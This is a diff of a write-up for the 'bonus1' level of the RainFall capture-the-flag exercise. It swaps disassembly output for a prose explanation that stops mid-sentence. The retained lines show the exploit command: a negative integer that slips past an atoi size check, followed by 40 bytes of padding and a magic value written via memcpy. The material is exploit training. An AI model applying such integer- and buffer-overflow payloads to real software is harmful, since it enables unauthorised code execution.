@@ -1,44 +1,8 @@
 ##  Description
 
-Contents of section .rodata:
- 8048578 03000000 01000200 7368002f 62696e2f  ........sh./bin/
- 8048588 736800                               sh.
+This level requires the user to input two arguments. The first one is run through `atoi()` and if the result is greater than 9, the program returns.
 
-> constant string used
-
-
-Disassembly of section .plt:
-
-08048310 <memcpy@plt-0x10>:
- 8048310:	ff 35 68 97 04 08    	pushl  0x8049768
- 8048316:	ff 25 6c 97 04 08    	jmp    *0x804976c
- 804831c:	00 00                	add    %al,(%eax)
-	...
-
-08048320 <memcpy@plt>:
- 8048320:	ff 25 70 97 04 08    	jmp    *0x8049770
- 8048326:	68 00 00 00 00       	push   $0x0
- 804832b:	e9 e0 ff ff ff       	jmp    8048310 <_init+0x3c>
-
-08048350 <execl@plt>:
- 8048350:	ff 25 7c 97 04 08    	jmp    *0x804977c
- 8048356:	68 18 00 00 00       	push   $0x18
- 804835b:	e9 b0 ff ff ff       	jmp    8048310 <_init+0x3c>
-
-08048360 <atoi@plt>:
- 8048360:	ff 25 80 97 04 08    	jmp    *0x8049780
- 8048366:	68 20 00 00 00       	push   $0x20
- 804836b:	e9 a0 ff ff ff       	jmp    8048310 <_init+0x3c>
-
-
-```bash
-bonus1@RainFall:~$ ./bonus1 9 bin
-bonus1@RainFall:~$ echo $?
-0
-bonus1@RainFall:~$ ./bonus1 10 bin
-bonus1@RainFall:~$ echo $?
-1
-```
+The program then calls `memcpy()` to write into a buffer, 
 
 ./bonus1 -2147483637 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
                                                    ^ F ^ L ^ O ^ W
